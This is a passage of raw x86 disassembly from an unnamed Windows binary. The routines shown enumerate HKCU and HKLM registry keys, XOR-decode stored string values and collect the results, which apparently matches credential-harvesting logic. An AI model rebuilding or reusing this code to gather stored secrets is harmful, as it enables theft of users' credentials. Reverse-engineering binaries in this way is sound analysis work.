  40417c:	ff 75 f8             	push   -0x8(%ebp)
  40417f:	e8 b6 7c 00 00       	call   0x40be3a
  404184:	59                   	pop    %ecx
  404185:	5f                   	pop    %edi
  404186:	5e                   	pop    %esi
  404187:	c9                   	leave
  404188:	c3                   	ret
  404189:	55                   	push   %ebp
  40418a:	8b ec                	mov    %esp,%ebp
  40418c:	81 ec 00 01 00 00    	sub    $0x100,%esp
  404192:	68 ff 00 00 00       	push   $0xff
  404197:	57                   	push   %edi
  404198:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  40419e:	50                   	push   %eax
  40419f:	e8 d2 7c 00 00       	call   0x40be76
  4041a4:	8a 8d 01 ff ff ff    	mov    -0xff(%ebp),%cl
  4041aa:	32 8d 00 ff ff ff    	xor    -0x100(%ebp),%cl
  4041b0:	8a 95 02 ff ff ff    	mov    -0xfe(%ebp),%dl
  4041b6:	80 c9 50             	or     $0x50,%cl
  4041b9:	33 c0                	xor    %eax,%eax
  4041bb:	84 d2                	test   %dl,%dl
  4041bd:	c6 45 fe 00          	movb   $0x0,-0x2(%ebp)
  4041c1:	74 1a                	je     0x4041dd
  4041c3:	56                   	push   %esi
  4041c4:	8d b5 02 ff ff ff    	lea    -0xfe(%ebp),%esi
  4041ca:	32 d1                	xor    %cl,%dl
  4041cc:	66 0f b6 d2          	movzbw %dl,%dx
  4041d0:	66 89 14 47          	mov    %dx,(%edi,%eax,2)
  4041d4:	40                   	inc    %eax
  4041d5:	46                   	inc    %esi
  4041d6:	8a 16                	mov    (%esi),%dl
  4041d8:	84 d2                	test   %dl,%dl
  4041da:	75 ee                	jne    0x4041ca
  4041dc:	5e                   	pop    %esi
  4041dd:	66 83 24 47 00       	andw   $0x0,(%edi,%eax,2)
  4041e2:	c9                   	leave
  4041e3:	c3                   	ret
  4041e4:	55                   	push   %ebp
  4041e5:	8b ec                	mov    %esp,%ebp
  4041e7:	81 ec 24 03 00 00    	sub    $0x324,%esp
  4041ed:	53                   	push   %ebx
  4041ee:	56                   	push   %esi
  4041ef:	57                   	push   %edi
  4041f0:	68 0c 0c 00 00       	push   $0xc0c
  4041f5:	6a 08                	push   $0x8
  4041f7:	ff 35 a0 3e 42 00    	push   0x423ea0
  4041fd:	ff 15 94 e0 40 00    	call   *0x40e094
  404203:	8b f8                	mov    %eax,%edi
  404205:	33 f6                	xor    %esi,%esi
  404207:	3b fe                	cmp    %esi,%edi
  404209:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40420c:	0f 84 4c 02 00 00    	je     0x40445e
  404212:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  404218:	50                   	push   %eax
  404219:	ba 30 e6 40 00       	mov    $0x40e630,%edx
  40421e:	e8 ee 12 00 00       	call   0x405511
  404223:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  404229:	50                   	push   %eax
  40422a:	ba f0 e5 40 00       	mov    $0x40e5f0,%edx
  40422f:	e8 dd 12 00 00       	call   0x405511
  404234:	59                   	pop    %ecx
  404235:	59                   	pop    %ecx
  404236:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  40423c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40423f:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  404245:	6a 08                	push   $0x8
  404247:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40424a:	56                   	push   %esi
  40424b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40424e:	50                   	push   %eax
  40424f:	e8 49 7c 00 00       	call   0x40be9d
  404254:	8d 45 8c             	lea    -0x74(%ebp),%eax
  404257:	50                   	push   %eax
  404258:	ba dc e5 40 00       	mov    $0x40e5dc,%edx
  40425d:	e8 af 12 00 00       	call   0x405511
  404262:	8d 45 a0             	lea    -0x60(%ebp),%eax
  404265:	50                   	push   %eax
  404266:	ba b8 e7 40 00       	mov    $0x40e7b8,%edx
  40426b:	e8 a1 12 00 00       	call   0x405511
  404270:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404273:	50                   	push   %eax
  404274:	ba 7c e8 40 00       	mov    $0x40e87c,%edx
  404279:	e8 93 12 00 00       	call   0x405511
  40427e:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404281:	50                   	push   %eax
  404282:	ba a4 e7 40 00       	mov    $0x40e7a4,%edx
  404287:	e8 85 12 00 00       	call   0x405511
  40428c:	83 c4 10             	add    $0x10,%esp
  40428f:	81 c7 fc 03 00 00    	add    $0x3fc,%edi
  404295:	89 7d e8             	mov    %edi,-0x18(%ebp)
  404298:	89 75 f0             	mov    %esi,-0x10(%ebp)
  40429b:	bb ff 00 00 00       	mov    $0xff,%ebx
  4042a0:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4042a3:	50                   	push   %eax
  4042a4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4042a7:	6a 08                	push   $0x8
  4042a9:	56                   	push   %esi
  4042aa:	ff 74 85 d4          	push   -0x2c(%ebp,%eax,4)
  4042ae:	68 01 00 00 80       	push   $0x80000001
  4042b3:	ff 15 00 e0 40 00    	call   *0x40e000
  4042b9:	85 c0                	test   %eax,%eax
  4042bb:	0f 85 6f 01 00 00    	jne    0x404430
  4042c1:	56                   	push   %esi
  4042c2:	56                   	push   %esi
  4042c3:	56                   	push   %esi
  4042c4:	56                   	push   %esi
  4042c5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4042c8:	50                   	push   %eax
  4042c9:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4042cf:	50                   	push   %eax
  4042d0:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4042d3:	56                   	push   %esi
  4042d4:	e9 36 01 00 00       	jmp    0x40440f
  4042d9:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4042dc:	ff 45 ec             	incl   -0x14(%ebp)
  4042df:	53                   	push   %ebx
  4042e0:	8d 45 8c             	lea    -0x74(%ebp),%eax
  4042e3:	50                   	push   %eax
  4042e4:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4042ea:	50                   	push   %eax
  4042eb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4042ee:	e8 9c 41 00 00       	call   0x40848f
  4042f3:	83 c4 0c             	add    $0xc,%esp
  4042f6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4042f9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042fc:	0f 84 fb 00 00 00    	je     0x4043fd
  404302:	3b c6                	cmp    %esi,%eax
  404304:	0f 86 f3 00 00 00    	jbe    0x4043fd
  40430a:	53                   	push   %ebx
  40430b:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40430e:	50                   	push   %eax
  40430f:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  404315:	50                   	push   %eax
  404316:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404319:	81 c7 fe 01 00 00    	add    $0x1fe,%edi
  40431f:	e8 6b 41 00 00       	call   0x40848f
  404324:	83 c4 0c             	add    $0xc,%esp
  404327:	83 f8 ff             	cmp    $0xffffffff,%eax
  40432a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40432d:	74 04                	je     0x404333
  40432f:	3b c6                	cmp    %esi,%eax
  404331:	77 2b                	ja     0x40435e
  404333:	53                   	push   %ebx
  404334:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404337:	50                   	push   %eax
  404338:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  40433e:	50                   	push   %eax
  40433f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404342:	e8 48 41 00 00       	call   0x40848f
  404347:	83 c4 0c             	add    $0xc,%esp
  40434a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40434d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404350:	0f 84 a7 00 00 00    	je     0x4043fd
  404356:	3b c6                	cmp    %esi,%eax
  404358:	0f 86 9f 00 00 00    	jbe    0x4043fd
  40435e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404361:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404364:	51                   	push   %ecx
  404365:	6a 01                	push   $0x1
  404367:	56                   	push   %esi
  404368:	8d 8d e0 fc ff ff    	lea    -0x320(%ebp),%ecx
  40436e:	51                   	push   %ecx
  40436f:	50                   	push   %eax
  404370:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404373:	ff 15 00 e0 40 00    	call   *0x40e000
  404379:	85 c0                	test   %eax,%eax
  40437b:	75 18                	jne    0x404395
  40437d:	53                   	push   %ebx
  40437e:	ff 75 e8             	push   -0x18(%ebp)
  404381:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404384:	56                   	push   %esi
  404385:	50                   	push   %eax
  404386:	8d 75 dc             	lea    -0x24(%ebp),%esi
  404389:	e8 cf 40 00 00       	call   0x40845d
  40438e:	83 c4 10             	add    $0x10,%esp
  404391:	33 f6                	xor    %esi,%esi
  404393:	eb 03                	jmp    0x404398
  404395:	83 c8 ff             	or     $0xffffffff,%eax
  404398:	83 f8 ff             	cmp    $0xffffffff,%eax
  40439b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40439e:	74 5d                	je     0x4043fd
  4043a0:	3b c6                	cmp    %esi,%eax
  4043a2:	76 59                	jbe    0x4043fd
  4043a4:	8b 7d e8             	mov    -0x18(%ebp),%edi
  4043a7:	e8 dd fd ff ff       	call   0x404189
  4043ac:	85 c0                	test   %eax,%eax
  4043ae:	7e 4d                	jle    0x4043fd
  4043b0:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  4043b6:	50                   	push   %eax
  4043b7:	ba 40 e9 40 00       	mov    $0x40e940,%edx
  4043bc:	e8 50 11 00 00       	call   0x405511
  4043c1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4043c4:	50                   	push   %eax
  4043c5:	8b cf                	mov    %edi,%ecx
  4043c7:	51                   	push   %ecx
  4043c8:	05 fe 01 00 00       	add    $0x1fe,%eax
  4043cd:	50                   	push   %eax
  4043ce:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  4043d4:	50                   	push   %eax
  4043d5:	ba 07 03 00 00       	mov    $0x307,%edx
  4043da:	8d b9 fe 01 00 00    	lea    0x1fe(%ecx),%edi
  4043e0:	e8 14 80 00 00       	call   0x40c3f9
  4043e5:	83 c4 14             	add    $0x14,%esp
  4043e8:	3b c6                	cmp    %esi,%eax
  4043ea:	7e 11                	jle    0x4043fd
  4043ec:	57                   	push   %edi
  4043ed:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4043f0:	e8 16 7c 00 00       	call   0x40c00b
  4043f5:	84 c0                	test   %al,%al
  4043f7:	59                   	pop    %ecx
  4043f8:	74 03                	je     0x4043fd
  4043fa:	ff 45 e4             	incl   -0x1c(%ebp)
  4043fd:	56                   	push   %esi
  4043fe:	56                   	push   %esi
  4043ff:	56                   	push   %esi
  404400:	56                   	push   %esi
  404401:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404404:	50                   	push   %eax
  404405:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  40440b:	50                   	push   %eax
  40440c:	ff 75 ec             	push   -0x14(%ebp)
  40440f:	ff 75 f8             	push   -0x8(%ebp)
  404412:	c7 45 fc 04 01 00 00 	movl   $0x104,-0x4(%ebp)
  404419:	ff 15 04 e0 40 00    	call   *0x40e004
  40441f:	85 c0                	test   %eax,%eax
  404421:	0f 84 b2 fe ff ff    	je     0x4042d9
  404427:	ff 75 f8             	push   -0x8(%ebp)
  40442a:	ff 15 14 e0 40 00    	call   *0x40e014
  404430:	ff 45 f0             	incl   -0x10(%ebp)
  404433:	83 7d f0 02          	cmpl   $0x2,-0x10(%ebp)
  404437:	0f 82 63 fe ff ff    	jb     0x4042a0
  40443d:	ff 75 f4             	push   -0xc(%ebp)
  404440:	e8 f5 79 00 00       	call   0x40be3a
  404445:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  404448:	59                   	pop    %ecx
  404449:	76 0a                	jbe    0x404455
  40444b:	8b 75 e0             	mov    -0x20(%ebp),%esi
  40444e:	e8 4d ef ff ff       	call   0x4033a0
  404453:	eb 09                	jmp    0x40445e
  404455:	ff 75 e0             	push   -0x20(%ebp)
  404458:	e8 dd 79 00 00       	call   0x40be3a
  40445d:	59                   	pop    %ecx
  40445e:	5f                   	pop    %edi
  40445f:	5e                   	pop    %esi
  404460:	5b                   	pop    %ebx
  404461:	c9                   	leave
  404462:	c3                   	ret
  404463:	55                   	push   %ebp
  404464:	8b ec                	mov    %esp,%ebp
  404466:	81 ec 00 01 00 00    	sub    $0x100,%esp
  40446c:	53                   	push   %ebx
  40446d:	56                   	push   %esi
  40446e:	8b cf                	mov    %edi,%ecx
  404470:	e8 ef 7e 00 00       	call   0x40c364
  404475:	99                   	cltd
  404476:	2b c2                	sub    %edx,%eax
  404478:	8b f0                	mov    %eax,%esi
  40447a:	d1 fe                	sar    $1,%esi
  40447c:	81 fe ff 00 00 00    	cmp    $0xff,%esi
  404482:	0f 8d 8d 00 00 00    	jge    0x404515
  404488:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  40448e:	8b c7                	mov    %edi,%eax
  404490:	e8 9e 7d 00 00       	call   0x40c233
  404495:	84 c0                	test   %al,%al
  404497:	74 7c                	je     0x404515
  404499:	33 c0                	xor    %eax,%eax
  40449b:	85 f6                	test   %esi,%esi
  40449d:	7e 0d                	jle    0x4044ac
  40449f:	80 b4 05 00 ff ff ff 	xorb   $0x5c,-0x100(%ebp,%eax,1)
  4044a6:	5c 
  4044a7:	40                   	inc    %eax
  4044a8:	3b c6                	cmp    %esi,%eax
  4044aa:	7c f3                	jl     0x40449f
  4044ac:	8a 9d 00 ff ff ff    	mov    -0x100(%ebp),%bl
  4044b2:	80 fb ff             	cmp    $0xff,%bl
  4044b5:	75 0e                	jne    0x4044c5
  4044b7:	8a 9d 02 ff ff ff    	mov    -0xfe(%ebp),%bl
  4044bd:	8d 85 03 ff ff ff    	lea    -0xfd(%ebp),%eax
  4044c3:	eb 06                	jmp    0x4044cb
  4044c5:	8d 85 01 ff ff ff    	lea    -0xff(%ebp),%eax
  4044cb:	0f b6 08             	movzbl (%eax),%ecx
  4044ce:	8d 4c 08 01          	lea    0x1(%eax,%ecx,1),%ecx
  4044d2:	0f b6 c3             	movzbl %bl,%eax
  4044d5:	8d 14 08             	lea    (%eax,%ecx,1),%edx
  4044d8:	8d b4 35 00 ff ff ff 	lea    -0x100(%ebp,%esi,1),%esi
  4044df:	3b d6                	cmp    %esi,%edx
  4044e1:	77 32                	ja     0x404515
  4044e3:	3b 45 08             	cmp    0x8(%ebp),%eax
  4044e6:	7c 2d                	jl     0x404515
  4044e8:	80 bd 00 ff ff ff ff 	cmpb   $0xff,-0x100(%ebp)
  4044ef:	75 06                	jne    0x4044f7
  4044f1:	03 4d 08             	add    0x8(%ebp),%ecx
  4044f4:	2a 5d 08             	sub    0x8(%ebp),%bl
  4044f7:	0f b6 c3             	movzbl %bl,%eax
  4044fa:	33 d2                	xor    %edx,%edx
  4044fc:	85 c0                	test   %eax,%eax
  4044fe:	7e 0e                	jle    0x40450e
  404500:	66 0f b6 34 0a       	movzbw (%edx,%ecx,1),%si
  404505:	66 89 34 57          	mov    %si,(%edi,%edx,2)
  404509:	42                   	inc    %edx
  40450a:	3b d0                	cmp    %eax,%edx
  40450c:	7c f2                	jl     0x404500
  40450e:	66 83 24 47 00       	andw   $0x0,(%edi,%eax,2)
  404513:	eb 02                	jmp    0x404517
  404515:	33 c0                	xor    %eax,%eax
  404517:	5e                   	pop    %esi
  404518:	5b                   	pop    %ebx
  404519:	c9                   	leave
  40451a:	c3                   	ret
  40451b:	55                   	push   %ebp
  40451c:	8b ec                	mov    %esp,%ebp
  40451e:	81 ec 0c 03 00 00    	sub    $0x30c,%esp
  404524:	53                   	push   %ebx
  404525:	56                   	push   %esi
  404526:	57                   	push   %edi
  404527:	6a 08                	push   $0x8
  404529:	33 db                	xor    %ebx,%ebx
  40452b:	53                   	push   %ebx
  40452c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40452f:	50                   	push   %eax
  404530:	e8 68 79 00 00       	call   0x40be9d
  404535:	68 20 0c 00 00       	push   $0xc20
  40453a:	6a 08                	push   $0x8
  40453c:	ff 35 a0 3e 42 00    	push   0x423ea0
  404542:	ff 15 94 e0 40 00    	call   *0x40e094
  404548:	8b f8                	mov    %eax,%edi
  40454a:	3b fb                	cmp    %ebx,%edi
  40454c:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40454f:	0f 84 32 02 00 00    	je     0x404787
  404555:	8d 87 fc 03 00 00    	lea    0x3fc(%edi),%eax
  40455b:	05 fe 01 00 00       	add    $0x1fe,%eax
  404560:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404563:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  404569:	50                   	push   %eax
  40456a:	ba 88 e5 40 00       	mov    $0x40e588,%edx
  40456f:	c7 45 d4 01 00 00 80 	movl   $0x80000001,-0x2c(%ebp)
  404576:	c7 45 d8 02 00 00 80 	movl   $0x80000002,-0x28(%ebp)
  40457d:	e8 8f 0f 00 00       	call   0x405511
  404582:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404585:	50                   	push   %eax
  404586:	ba dc e5 40 00       	mov    $0x40e5dc,%edx
  40458b:	e8 81 0f 00 00       	call   0x405511
  404590:	8d 45 80             	lea    -0x80(%ebp),%eax
  404593:	50                   	push   %eax
  404594:	ba 70 e5 40 00       	mov    $0x40e570,%edx
  404599:	e8 73 0f 00 00       	call   0x405511
  40459e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4045a1:	50                   	push   %eax
  4045a2:	ba b8 e7 40 00       	mov    $0x40e7b8,%edx
  4045a7:	e8 65 0f 00 00       	call   0x405511
  4045ac:	8d 45 98             	lea    -0x68(%ebp),%eax
  4045af:	50                   	push   %eax
  4045b0:	ba a4 e7 40 00       	mov    $0x40e7a4,%edx
  4045b5:	e8 57 0f 00 00       	call   0x405511
  4045ba:	83 c4 14             	add    $0x14,%esp
  4045bd:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4045c0:	be ff 00 00 00       	mov    $0xff,%esi
  4045c5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4045c8:	50                   	push   %eax
  4045c9:	6a 08                	push   $0x8
  4045cb:	53                   	push   %ebx
  4045cc:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4045d2:	50                   	push   %eax
  4045d3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4045d6:	ff 74 85 d4          	push   -0x2c(%ebp,%eax,4)
  4045da:	ff 15 00 e0 40 00    	call   *0x40e000
  4045e0:	85 c0                	test   %eax,%eax
  4045e2:	0f 85 8b 01 00 00    	jne    0x404773
  4045e8:	53                   	push   %ebx
  4045e9:	53                   	push   %ebx
  4045ea:	53                   	push   %ebx
  4045eb:	53                   	push   %ebx
  4045ec:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4045ef:	50                   	push   %eax
  4045f0:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  4045f6:	50                   	push   %eax
  4045f7:	53                   	push   %ebx
  4045f8:	ff 75 fc             	push   -0x4(%ebp)
  4045fb:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4045fe:	c7 45 f4 04 01 00 00 	movl   $0x104,-0xc(%ebp)
  404605:	ff 15 04 e0 40 00    	call   *0x40e004
  40460b:	e9 52 01 00 00       	jmp    0x404762
  404610:	ff 45 ec             	incl   -0x14(%ebp)
  404613:	56                   	push   %esi
  404614:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404617:	50                   	push   %eax
  404618:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  40461e:	50                   	push   %eax
  40461f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404622:	e8 68 3e 00 00       	call   0x40848f
  404627:	83 c4 0c             	add    $0xc,%esp
  40462a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40462d:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404630:	0f 84 07 01 00 00    	je     0x40473d
  404636:	3b c3                	cmp    %ebx,%eax
  404638:	0f 86 ff 00 00 00    	jbe    0x40473d
  40463e:	56                   	push   %esi
  40463f:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404642:	50                   	push   %eax
  404643:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  404649:	50                   	push   %eax
  40464a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40464d:	81 c7 fe 01 00 00    	add    $0x1fe,%edi
  404653:	e8 37 3e 00 00       	call   0x40848f
  404658:	8b d8                	mov    %eax,%ebx
  40465a:	83 c4 0c             	add    $0xc,%esp
  40465d:	83 fb ff             	cmp    $0xffffffff,%ebx
  404660:	0f 84 d5 00 00 00    	je     0x40473b
  404666:	85 db                	test   %ebx,%ebx
  404668:	0f 86 cd 00 00 00    	jbe    0x40473b
  40466e:	56                   	push   %esi
  40466f:	8d 45 98             	lea    -0x68(%ebp),%eax
  404672:	50                   	push   %eax
  404673:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  404679:	50                   	push   %eax
  40467a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40467d:	05 fe 01 00 00       	add    $0x1fe,%eax
  404682:	8d b8 fe 01 00 00    	lea    0x1fe(%eax),%edi
  404688:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40468b:	e8 ff 3d 00 00       	call   0x40848f
  404690:	83 c4 0c             	add    $0xc,%esp
  404693:	83 f8 ff             	cmp    $0xffffffff,%eax
  404696:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404699:	0f 84 9c 00 00 00    	je     0x40473b
  40469f:	85 c0                	test   %eax,%eax
  4046a1:	0f 86 94 00 00 00    	jbe    0x40473b
  4046a7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4046aa:	03 d8                	add    %eax,%ebx
  4046ac:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4046af:	05 fe 01 00 00       	add    $0x1fe,%eax
  4046b4:	53                   	push   %ebx
  4046b5:	8d b8 fe 01 00 00    	lea    0x1fe(%eax),%edi
  4046bb:	e8 a3 fd ff ff       	call   0x404463
  4046c0:	85 c0                	test   %eax,%eax
  4046c2:	59                   	pop    %ecx
  4046c3:	7e 76                	jle    0x40473b
  4046c5:	8d 45 80             	lea    -0x80(%ebp),%eax
  4046c8:	50                   	push   %eax
  4046c9:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  4046cf:	50                   	push   %eax
  4046d0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4046d3:	e8 74 3e 00 00       	call   0x40854c
  4046d8:	8b f8                	mov    %eax,%edi
  4046da:	83 ff 01             	cmp    $0x1,%edi
  4046dd:	59                   	pop    %ecx
  4046de:	59                   	pop    %ecx
  4046df:	72 08                	jb     0x4046e9
  4046e1:	81 ff ff ff 00 00    	cmp    $0xffff,%edi
  4046e7:	76 03                	jbe    0x4046ec
  4046e9:	6a 15                	push   $0x15
  4046eb:	5f                   	pop    %edi
  4046ec:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  4046f2:	50                   	push   %eax
  4046f3:	ba 60 e9 40 00       	mov    $0x40e960,%edx
  4046f8:	e8 14 0e 00 00       	call   0x405511
  4046fd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404700:	57                   	push   %edi
  404701:	8b 7d e0             	mov    -0x20(%ebp),%edi
  404704:	50                   	push   %eax
  404705:	8d 88 fc 03 00 00    	lea    0x3fc(%eax),%ecx
  40470b:	51                   	push   %ecx
  40470c:	05 fe 01 00 00       	add    $0x1fe,%eax
  404711:	50                   	push   %eax
  404712:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  404718:	50                   	push   %eax
  404719:	ba 11 03 00 00       	mov    $0x311,%edx
  40471e:	e8 d6 7c 00 00       	call   0x40c3f9
  404723:	83 c4 18             	add    $0x18,%esp
  404726:	85 c0                	test   %eax,%eax
  404728:	7e 11                	jle    0x40473b
  40472a:	57                   	push   %edi
  40472b:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40472e:	e8 d8 78 00 00       	call   0x40c00b
  404733:	84 c0                	test   %al,%al
  404735:	59                   	pop    %ecx
  404736:	74 03                	je     0x40473b
  404738:	ff 45 e8             	incl   -0x18(%ebp)
  40473b:	33 db                	xor    %ebx,%ebx
  40473d:	53                   	push   %ebx
  40473e:	53                   	push   %ebx
  40473f:	53                   	push   %ebx
  404740:	53                   	push   %ebx
  404741:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404744:	50                   	push   %eax
  404745:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  40474b:	50                   	push   %eax
  40474c:	ff 75 ec             	push   -0x14(%ebp)
  40474f:	c7 45 f4 04 01 00 00 	movl   $0x104,-0xc(%ebp)
  404756:	ff 75 fc             	push   -0x4(%ebp)
  404759:	ff 15 04 e0 40 00    	call   *0x40e004
  40475f:	8b 7d f8             	mov    -0x8(%ebp),%edi
  404762:	85 c0                	test   %eax,%eax
  404764:	0f 84 a6 fe ff ff    	je     0x404610
  40476a:	ff 75 fc             	push   -0x4(%ebp)
  40476d:	ff 15 14 e0 40 00    	call   *0x40e014
  404773:	ff 45 f0             	incl   -0x10(%ebp)
  404776:	83 7d f0 02          	cmpl   $0x2,-0x10(%ebp)
  40477a:	0f 82 45 fe ff ff    	jb     0x4045c5
  404780:	57                   	push   %edi
  404781:	e8 b4 76 00 00       	call   0x40be3a
  404786:	59                   	pop    %ecx
  404787:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  40478a:	76 0a                	jbe    0x404796
  40478c:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40478f:	e8 0c ec ff ff       	call   0x4033a0
  404794:	eb 09                	jmp    0x40479f
  404796:	ff 75 e4             	push   -0x1c(%ebp)
  404799:	e8 9c 76 00 00       	call   0x40be3a
  40479e:	59                   	pop    %ecx
  40479f:	5f                   	pop    %edi
  4047a0:	5e                   	pop    %esi
  4047a1:	5b                   	pop    %ebx
  4047a2:	c9                   	leave
  4047a3:	c3                   	ret
  4047a4:	b2 3b                	mov    $0x3b,%dl
  4047a6:	eb 05                	jmp    0x4047ad
  4047a8:	3a c2                	cmp    %dl,%al
  4047aa:	74 0d                	je     0x4047b9
  4047ac:	41                   	inc    %ecx
  4047ad:	8a 01                	mov    (%ecx),%al
  4047af:	84 c0                	test   %al,%al
  4047b1:	75 f5                	jne    0x4047a8
  4047b3:	3a c2                	cmp    %dl,%al
  4047b5:	74 02                	je     0x4047b9
  4047b7:	33 c9                	xor    %ecx,%ecx
  4047b9:	85 c9                	test   %ecx,%ecx
  4047bb:	74 0e                	je     0x4047cb
  4047bd:	eb 02                	jmp    0x4047c1
  4047bf:	8b c8                	mov    %eax,%ecx
  4047c1:	8d 41 01             	lea    0x1(%ecx),%eax
  4047c4:	38 10                	cmp    %dl,(%eax)
  4047c6:	74 f7                	je     0x4047bf
  4047c8:	c6 01 00             	movb   $0x0,(%ecx)
  4047cb:	c3                   	ret
  4047cc:	55                   	push   %ebp
  4047cd:	8b ec                	mov    %esp,%ebp
  4047cf:	83 e4 f8             	and    $0xfffffff8,%esp
  4047d2:	81 ec 8c 02 00 00    	sub    $0x28c,%esp
  4047d8:	53                   	push   %ebx
  4047d9:	56                   	push   %esi
  4047da:	8b 75 0c             	mov    0xc(%ebp),%esi
  4047dd:	57                   	push   %edi
  4047de:	ff 75 08             	push   0x8(%ebp)
  4047e1:	8d 8c 24 94 00 00 00 	lea    0x94(%esp),%ecx
  4047e8:	8d 46 2c             	lea    0x2c(%esi),%eax
  4047eb:	51                   	push   %ecx
  4047ec:	e8 2b 3a 00 00       	call   0x40821c
  4047f1:	84 c0                	test   %al,%al
  4047f3:	59                   	pop    %ecx
  4047f4:	59                   	pop    %ecx
  4047f5:	0f 84 8e 02 00 00    	je     0x404a89
  4047fb:	f6 06 10             	testb  $0x10,(%esi)
  4047fe:	74 43                	je     0x404843
  404800:	8d 44 24 28          	lea    0x28(%esp),%eax
  404804:	50                   	push   %eax
  404805:	ba 58 e5 40 00       	mov    $0x40e558,%edx
  40480a:	e8 02 0d 00 00       	call   0x405511
  40480f:	59                   	pop    %ecx
  404810:	8d 44 24 28          	lea    0x28(%esp),%eax
  404814:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404818:	33 c0                	xor    %eax,%eax
  40481a:	50                   	push   %eax
  40481b:	50                   	push   %eax
  40481c:	50                   	push   %eax
  40481d:	ff 75 10             	push   0x10(%ebp)
  404820:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  404824:	68 cc 47 40 00       	push   $0x4047cc
  404829:	6a 05                	push   $0x5
  40482b:	6a 01                	push   $0x1
  40482d:	50                   	push   %eax
  40482e:	8d 84 24 b0 00 00 00 	lea    0xb0(%esp),%eax
  404835:	50                   	push   %eax
  404836:	e8 0d 3a 00 00       	call   0x408248
  40483b:	83 c4 24             	add    $0x24,%esp
  40483e:	e9 46 02 00 00       	jmp    0x404a89
  404843:	8d 84 24 90 00 00 00 	lea    0x90(%esp),%eax
  40484a:	50                   	push   %eax
  40484b:	8d 74 24 2c          	lea    0x2c(%esp),%esi
  40484f:	e8 70 3b 00 00       	call   0x4083c4
  404854:	84 c0                	test   %al,%al
  404856:	59                   	pop    %ecx
  404857:	0f 84 2c 02 00 00    	je     0x404a89
  40485d:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404861:	8b 54 24 28          	mov    0x28(%esp),%edx
  404865:	8d 4c 24 18          	lea    0x18(%esp),%ecx
